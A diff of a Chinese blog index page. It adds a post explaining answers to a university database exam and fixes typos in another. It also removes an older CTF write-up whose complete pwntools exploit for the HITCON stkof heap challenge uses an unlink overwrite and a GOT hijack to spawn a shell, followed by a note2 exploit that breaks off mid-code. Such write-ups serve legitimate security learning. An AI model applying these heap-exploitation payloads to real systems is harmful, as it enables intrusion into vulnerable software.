@@ -252,6 +252,206 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/山科大数据库试题3详解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/03/山科大数据库试题3详解/" itemprop="url">山科大数据库试题3详解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-03T11:18:06+08:00">
+                2019-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据库/" itemprop="url" rel="index">
+                    <span itemprop="name">数据库</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><strong>1、一个实体转换为一个关系模式。关系的码为？</strong></p>
+<p><em>entity的key</em></p>
+<p>试题1详解中详细总结了entity变relation以及relationship变relation时key的问题</p>
+<p><strong>2、元组关系演算表达式，{t|R(t)^S(t)}表达的是</strong></p>
+<p><em>S-R</em></p>
+<p>转换为S非R，即S-R</p>
+<p><strong>3、为保护数据库中的信息，防止未经授权或非法的使用所造成的数据泄露、更改和破坏，称为数据库的</strong></p>
+<p><em>安全性</em></p>
+<p><strong>4、一台机器可以加工多个零件，一个零件可以在多台机器上加工，则机器和零件的为xx的联系</strong></p>
+<p><em>多对多</em></p>
+<p><strong>5、关系数据模型的三个组成部分不包括</strong></p>
+<p><em>恢复</em></p>
+<p>详细的三个组成部分在试题2中</p>
+<p><strong>6、xx是数据库物理结构和存储方式的描述</strong></p>
+<p><em>内模式</em></p>
+<p>试题1中给出了详细解释</p>
+<p><strong>7、若关系模式R（U，F）属于3NF，则</strong></p>
+<p>试题1原题，不再解释，总结一下几个NF的特点</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g3p4rdv07xj309w06mt8n.jpg" alt=""></p>
+<ul>
+<li><p>1NF：简单说就是列不可再分，比如name这个列，可以分成first name和last name</p>
+</li>
+<li><p>2NF：非primary key与primary key必须为完全函数依赖，可以通过projection将部分函数依赖的attr和其依赖的attr做一个新表，举个栗子</p>
+</li>
+</ul>
+<p>(cno、sno)为primary key，(cno，sno)—&gt;Ggrade，Sno—&gt;Sdept，(Sno，Cno)—&gt;Sloc，Sdept—&gt;Sloc</p>
+<p>上面的栗子中很显然Sdept只由Sno决定，只是(cno，Sno)这个primary key的一部分，另外Sloc也同样存在问题，Sdept—&gt;Sloc，而Sno—&gt;Sdept，所以Sno就可以决定Sdept了，很显然不符合2NF。</p>
+<p>而且该relation还存在很多问题，比如当我们插入tuple时，可能学生还没有选课，所以cno为null，但实际上学生的其他信息都有了，却不能插入该表。</p>
+<p>我们可以通过projection的方式将该relation拆分，将非primary key部分拆出来，Ggrade完全依赖于primary key所以不用处理，而Sloc和Sdept部分函数依赖primary key，我们就把他们和依赖的那个attr拆出来做成一张新表SDL(sno，sdept，sloc)</p>
+<ul>
+<li>3NF：简单一句话，在2NF的基础上，非primary key必须直接依赖于primary key，不能通过传递的方式实现。而2NF又要求非primary key必须依赖primary key，所以可以简单的理解为，在满足2NF的情况下，3NF就是非primary key之间不能存在依赖。</li>
+</ul>
+<p>还是以上面的栗子，我们拆分出来的SDL中，sdept—&gt;sloc，而primary key为sno，显然不满足3NF，所以我们需要再拆成两个表，DL(sdept，Sloc)和SD(sno，sdept)</p>
+<ul>
+<li>BCNF：不存在key之间相互依赖</li>
+</ul>
+<p>比如一家仓库，仓库有技术负责，技术负责可以确定是哪个仓库号，而仓库号也可以确定是哪个技术负责，仓库号可以决定商品号，仓库号是primary key，而技术负责其实也是candidate key。</p>
+<p>可以看到relation是满足3NF的，但是由于技术负责和仓库号的关系，不是BCNF</p>
+<p>从这些栗子中也可以看到NF等级越高，往往就需要把relation拆的越惨，而当我们进行查询时，还需要将表进行连接消耗资源，而实际上现在磁盘空间成本降低，所以有一定的数据冗余比起连接的资源消耗更让人可以接受，所以NF等级并不是越高越好</p>
+<p><strong>8、概念结构设计阶段得到的结果是</strong></p>
+<p><em>ER图</em></p>
+<p>试题2中详细给出了6个阶段</p>
+<p><strong>9、并发操作会带来哪些数据不一致性</strong></p>
+<p><em>丢失修改、不可重复读、读脏数据</em></p>
+<p><strong>10、DBMS中实现事务持久性的子系统是？</strong></p>
+<p><em>恢复管理子系统</em></p>
+<p>在试题1中对几种子系统进行了说明</p>
+<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p><strong>数据库</strong></p>
+<p>长期存储在计算机内的、有组织的、可共享的数据结构</p>
+<p><strong>参照完整性</strong></p>
+<p>之前详细说过了，就是foreign key不是null就是它所reference的primary key所在relation中的值</p>
+<p><strong>事务</strong></p>
+<p>用户定义的一个数据库操作序列，这些操作要么全做，要么全不做，是一个不可分割的工作单位</p>
+<p><strong>封锁</strong></p>
+<p>事务T在对某个数据对象操作之前，先像系统发出请求，对其加锁。加锁后事务T就对该数据对象有了一定的控制，在事务T释放它的锁之前，其他的事务不能更新此数据对象。</p>
+<p><strong>MAC</strong></p>
+<p>强制存储控制。</p>
+<p>每个数据对象被标以一定的密级，每一个用户也被授予某一个级别的许可证，对于任意一个对象，只有具有合法许可证的用户才可以存取。</p>
+<h2 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h2><p><strong>1、什么是数据库系统的三级模式结构？这种结构的优点是什么？</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/02/山科大数据库试题2详解/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -375,7 +575,7 @@
 <p>​        8、视图的建立和删除只影响视图本身，不影响对应的基本表。</p>
 <p><strong>3、数据的正确性和相容性是指数据库的？</strong></p>
 <p><em>完整性</em></p>
-<p>数据库中完整性（Integrity）一词是指数据的正确性，相容性，防止错误的数据进入数据库。</p>
+<p>数据中完整性（Integrity）一词是指数据的正确性，相容性，防止错误的数据进入数据库。</p>
 <ul>
 <li>正确性：数据的合法性，例如数值型数据中只能含数字而不能含字母。</li>
 <li>相容性：表示同一事实的两个数据应相同，不一致就是不相容。</li>
@@ -412,13 +612,44 @@
 </li>
 </ul>
 <p><strong>8、数据库恢复的基础是利用转储的冗余数据。冗余的数据包括</strong></p>
-<p><em>日记文件、数据库后备副本</em></p>
+<p><em>日志文件、数据库后备副本</em></p>
 <p><strong>9、关系代数的五个基本操作可直接转换成元组关系演算表达式，他们是并、差、投影、选择</strong></p>
 <p><em>笛卡尔积</em></p>
 <p>数据库有五个基本的演算，四个扩展的演算，四个扩展分别是交、除、扩展投影、自然连接</p>
 <p><strong>10、若关系R（U，F）属于3NF，则</strong></p>
 <p><em>仍存在一定的插入和删除异常</em></p>
 <p>第一篇讲了，不再赘述</p>
+<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p><strong>1、数据库系统</strong></p>
+<p>在计算机系统中引入数据库后的系统，一般由数据库、数据库管理系统、应用程序、数据库管理员、用户构成</p>
+<p><strong>2、关系模式</strong></p>
+<p>关系的描述称为关系模式，可以形式化地表示为：R(U，D，dom，F)，R为relation关系名，U为组成该关系的属性名的集合，D为属性组U中所用属性所来自的域，dom为属性向域的映像集合，F为属性间数据的依赖关系的结合。</p>
+<p><strong>3、事务</strong></p>
+<p>用户定义的一个数据库操作序列，这些操作要么全做要么全不做，是一个不可分割的工作单位</p>
+<p><strong>4、二段锁协议</strong></p>
+<p>所有的事务必须分为两个阶段对数据项加锁和解锁</p>
+<ul>
+<li>在对任何数据进行读、写操作之前，首先要申请并获得对该数据的封锁</li>
+<li>在释放一个封锁后，事务不再申请和获得其他任何封锁</li>
+</ul>
+<p><strong>5、自主存储控制DAC</strong></p>
+<p>用户对于不同的数据对象有不同的存储权限，不同的用户对同一对象也用不同的权限，而且用户可以将其拥有的ci存取权限转授给其他用户</p>
+<h2 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h2><p><strong>1、什么是数据模型？数据模型的三要素是什么？</strong></p>
+<p>数据库中用来对现实世界进行抽象的工具，是数据库中用于提供信息表示和操作手段的形式架构。数据模型是由数据结构、数据操作和完整性约束三部分组成。</p>
+<p><strong>2、数据库系统的三级模式结构是什么？这种结构的优点是什么？</strong></p>
+<ul>
+<li>外模式，也称用户模式、子模式，是数据库用户看到的数据视图</li>
+<li>模式，也称逻辑模式，是数据库中全体数据的逻辑结构和特性的描述，是所有用户的公共数据视图</li>
+<li>内模式，也称存储模式，是数据库在系统内部的表示，即对数据的物理结构和存储方式的描述</li>
+</ul>
+<p>数据库系统的三级模式是对数据的三个抽象级别，他对数据的具体组织留给DBMS管理，使用户能逻辑抽象的处理数据，而不必关心数据在计算机中的表示和存储。</p>
+<p><strong>3、关系模式中的实体完整性规则和参照完整性规则分别是什么？</strong></p>
+<p>实体完整性规则：若属性A为基本关系R的主属性，则A不能取空值</p>
+<p>参照完整性规则：若属性F是关系R的foreign key，它reference关系S的primary key，那么F的取值要么是null，要么是S上某个tuple的primary key的值</p>
+<p><strong>4、什么是日志文件？为什么要设置日志文件</strong></p>
+<p>日志文件是用来记录transaction对于数据库的更新操作的文件，设立日志文件的目的是：进行事务故障的恢复；进行系统故障的恢复；协助后备副本进行介质故障恢复</p>
+<p>关于故障的相关内容在试题1中详细进行了说明</p>
+<p><strong>5、并发控制会引发哪些不一致？</strong></p>
+<p>丢失修改、不可重复读、读”脏”数据</p>
 
           
         
@@ -627,7 +858,7 @@
 </tr>
 </tbody>
 </table>
-<p>natural join也可以看作是两个relation先进行一次笛卡尔积，然后在进行一次select，筛选出同名attr相同的tuple，最后进行project将同名属性仅保留一项。由此也可以知道，两个relation进行natural join时，如果没有同名的attr，那么得到的tuple最多，即为x*y个，而如果对一个表进行relation，那么得到的tuple最少，就是x个。</p>
+<p>natural join也可以看作是两个relation先进行一次笛卡尔积，然后在进行一次select，筛选出同名attr相同的tuple，最后进行project将同名属性仅保留一项。由此也可以知道，两个relation进行natural join时，如果没有同名的attr，那么得到的tuple最多，即为x*y个，而如果对一个表进行natural join，那么得到的tuple最少，就是x个。</p>
 <p><strong>2、若关系模式R（U，F）属于3NF，则</strong></p>
 <p><em>仍存在一定的插入和删除异常</em></p>
 <p>3NF实际上是BCNF的mini版，BCNF是用来消除冗余数据的，但由于BCNF无法保证function dependency，所以我们接受了一定的冗余，放宽了BCNF的要求，就有了3NF。BCNF一定是3NF，但3NF不一定是BCNF</p>
@@ -2539,165 +2770,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/Unlink实战-2014-HITCON-stkof/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/02/Unlink实战-2014-HITCON-stkof/" itemprop="url">Unlink实战 -- 2014 HITCON stkof</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T12:13:14+08:00">
-                2019-03-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Unlink实战"><a href="#Unlink实战" class="headerlink" title="Unlink实战"></a>Unlink实战</h1><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p>unlink技术前面已经学习过了，简单回忆一下其中的关键：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FD=P-&gt;fd </span><br><span class="line">BK=P-&gt;bk</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br><span class="line"></span><br><span class="line">fd = &amp;P<span class="number">-0x18</span></span><br><span class="line">bk = &amp;P<span class="number">-0x10</span></span><br><span class="line">P = &amp;P<span class="number">-0X18</span></span><br></pre></td></tr></table></figure>
-<p>ida分析后可以看出程序主要有如下的几个功能：</p>
-<ul>
-<li>add，功能主要是输入一个size，分配相应的空间，并将指针存在bss段的</li>
-<li>edit，指定index，输入size，修改相应index的内容</li>
-<li>delete，指定index，free掉相应的空间</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">n = atoll(&amp;s);</span><br><span class="line">ptr = ::s[v2];</span><br><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ptr += i;</span><br><span class="line">  n -= i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在edit函数中size由我们输出，没有检查大小，存在溢出漏洞，而bss段中有一数组专门存放我们chunk地址，确定攻击思路为unlink后改写系统函数的地址。</p>
-<p>首先用gdb调试，简单分配两个chunk观察内存中的分布情况，设0x602140为head</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g0nle1paazj30ui046wgl.jpg" alt="image-20190301210035807"></p>
-<p>很显然我们的第一个chunk在head+0x8的位置，但要注意，该程序没有进行setbuf操作，所以会在gets、printf时设置输入输出的缓冲区，为了避免产生影响，我们先分配一个chunk保证完成输入输出完成相应的初始化操作，紧接着再考虑攻击的问题。我们构造三个chunk，第一个保留，第二个用来溢出，我设置为0x30，第三个则要大一些（在smallbin的范围内）来触发unlink</p>
-<p>我们在chunk2中伪造一个chunk。伪造的重点是chunk的size与溢出下一个chunk的pre_size是否相等、fd与bk指针能不能通过检查、是否将下一个chunk的pre_inuse位成功修改，具体的payload的构造如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">'A'</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
-<p>之后我们free掉chunk3，此时由于chunk3的pre_inuse显示fake_chunk是free状态，会发生合并，触发unlink，导致我们原本chunk2在bss段位置p的内容变成了p-0x18的值，如图所示</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0o9ughp95j30ue04mdhf.jpg" alt="image-20190302110646389"></p>
-<p>之后我们就可以通过edit chunk2的方式就可以从0x602138开始写入值了，注意由于我们写的位置是head+0x10-0x18，所以首先要填充0x10，既然要修改系统函数的地址那我们就必须要知道libc的base，我们可以通过puts函数来泄漏某个函数的地址进而计算。这样我们就有了构造下一步payload的思路，我们将chunk1的位置填为free_got，chunk2的位置填为使用过的任意函数（这里我选择了puts）的got，这样我们再次edit chunk1的时候就可以修改free_got的内容了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">8</span>  + <span class="string">'b'</span>*<span class="number">8</span> + p64(free_got) + p64(puts_got)</span><br></pre></td></tr></table></figure>
-<p>利用edit将puts的plt地址填入free_got后，我们再次free chunk2实际上就是输出puts_got的值了，接下来就是简单的处理拿到libc的base后算出system的地址，然后再次edit chunk1，把free_got的值改为system。</p>
-<p>最后，我们创建一个chunk4，在里面写入/bin/sh，再free掉就大功告成了</p>
-<p>完整exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line"><span class="comment">#p = remote("192.168.211.126", 10000)</span></span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line">fd = head + <span class="number">0x10</span> - <span class="number">0x18</span></span><br><span class="line">bk = head + <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x50</span>) <span class="comment"># idx 1</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment"># idx 2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># idx 3</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment"># idx 4</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">'A'</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload1)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">8</span>  + <span class="string">'b'</span>*<span class="number">8</span> + p64(free_got) + p64(puts_got)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">payload3 = p64(puts_plt)</span><br><span class="line">edit(<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"puts_addr is %x\n"</span> %puts_addr)</span><br><span class="line">log.success(<span class="string">"libc_base is %x\n"</span> %libc_base)</span><br><span class="line">log.success(<span class="string">"system_addr is %x\n"</span> %system_addr)</span><br><span class="line"></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload4)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>##2016 ZCTF note2</p>
-<p>首先还是ida分析，整理之后发现有这几个功能：</p>
-<ul>
-<li>add，添加一个note和note的内容（会检查长度不能大于0x80，且会有一个bss段的ptr来存储地址）</li>
-<li><p>show，展示指定index的note的内容</p>
-</li>
-<li><p>edit，修改指定index的note的内容</p>
-</li>
-<li><p>delete，删除指定index的note</p>
-</li>
-</ul>
-<p>通过观察add我们发现了这个函数存在漏洞</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 size, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]    </span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; size - <span class="number">1</span> &gt; i; ++i )          <span class="comment">//a2是我们输入的size</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>当我们输入的size为0是时，由于malloc的分配机制实际上会分配给我们0x20大小的空间，但是在这个读取数据的函数里size-1（注意size是无符号整数），也就变成了一个超级大的数，我们可以输入任意大小的数据了</p>
-<p>拿我们就有思路了，我们可以malloc三个chunk，大小分别为0x80、0（实际上分配的是0x20，由于是小于fast_max，所以会进入fastbin，再次分配0时会从fastbin中取出）、0x80，然后拿chunk2去溢出chunk3，最终实现unlink，剩下的步骤就和上一题目一样了，具体过程不在赘述</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the length of the note content:(less than 128)"</span>)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span 